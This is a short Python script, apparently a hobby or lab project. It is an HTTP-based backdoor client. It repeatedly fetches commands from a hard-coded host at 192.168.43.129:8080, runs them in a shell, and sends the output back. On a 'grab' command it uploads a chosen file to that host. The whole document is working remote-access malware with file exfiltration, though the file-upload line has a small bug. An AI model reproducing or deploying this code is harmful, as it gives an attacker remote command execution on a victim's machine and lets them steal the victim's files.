import requests
import subprocess
import os

URL = "http://192.168.43.129:8080/store"
while True :
    req = requests.get(URL)
    command = req.text

    if 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = URL + "/store"
            files = {"file",open(path,'rb')}
            r = requests.post(url=url,files=files)
        else : 
            requests.post(url=URL,data="[-] File not found".encode())
    else :
        CDM = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        ) 

        requests.post(url=URL,data=CDM.stdout.read())
        requests.post(url=URL, data=CDM.stderr.read())
